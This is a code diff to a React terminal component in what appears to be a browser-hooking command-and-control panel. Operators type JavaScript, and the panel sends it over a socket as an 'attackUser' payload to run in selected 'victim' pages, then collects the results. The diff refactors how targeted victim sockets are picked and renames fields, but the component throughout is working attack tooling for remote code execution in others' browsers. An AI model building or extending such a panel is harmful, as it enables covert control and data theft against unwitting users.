@@ -29,7 +29,17 @@ class Terminal extends Component {
 
   _commandHandler(command, term) {
     if (command !== '') {
-      let activeTargetSocketIds = utils.objToArrayOfValues(this.props.activeTargets, 'socketId')
+      let { victims } = this.props
+      let activeTargetSocketIds = Object.keys(this.props.activeTargets).reduce((socketIds, targetId)=>{
+        let target = victims[targetId]
+        Object.values(target.activePagesBySocketId).forEach((page)=>{
+          if(page.targeted){
+            socketIds.push(page.socketId)
+          }
+        })
+        return socketIds
+      },[])
+
       if(activeTargetSocketIds.length === 0){
         term.echo('Select a target first')
       }
@@ -39,11 +49,11 @@ class Terminal extends Component {
       }
 
       activeTargetSocketIds.forEach((socketId)=>{
-        this.props.logger(`Executing command line attack on victim ${this.props.victimsBySocketIdMap[socketId].id}...`)
+        this.props.logger(`Executing command line attack on victim ${this.props.victimIdBySocketIdMap[socketId]}...`)
         let attackInstanceId = `${socketId}_${new Date().valueOf()}`
         this.props.followupBuffer[attackInstanceId] = function(params, logger){}
         this.props.socket.emit('attackUser', {
-          userSocket: socketId,
+          victimSocket: socketId,
           attack: `function(params){
             params.time = new Date();
             let _result_ = (function(){ ${command} })()
@@ -61,7 +71,7 @@ class Terminal extends Component {
               });
             }
           }`,
-          params: {victim: this.props.victimsBySocketIdMap[socketId].id, id: attackInstanceId}
+          params: {victim: this.props.victimIdBySocketIdMap[socketId], id: attackInstanceId}
         })
       })
     }
@@ -79,17 +89,19 @@ class Terminal extends Component {
 Terminal.propTypes = {
   actions: PropTypes.object,
   activeTargets: PropTypes.object,
+  victims: PropTypes.object,
   followupBuffer: PropTypes.object.isRequired,
   socket: PropTypes.object.isRequired,
-  victimsBySocketIdMap: PropTypes.object
+  victimIdBySocketIdMap: PropTypes.object
 }
 
 function mapStateToProps(state, props) {
   return {
     activeTargets: state.victims.activeTargets,
+    victims: state.victims.victims,
     followupBuffer: state.attacks.followupBuffer,
     logger: state.terminal.logger,
-    victimsBySocketIdMap: state.victims.victimsBySocketIdMap
+    victimIdBySocketIdMap: state.victims.victimIdBySocketIdMap
   }
 }
 
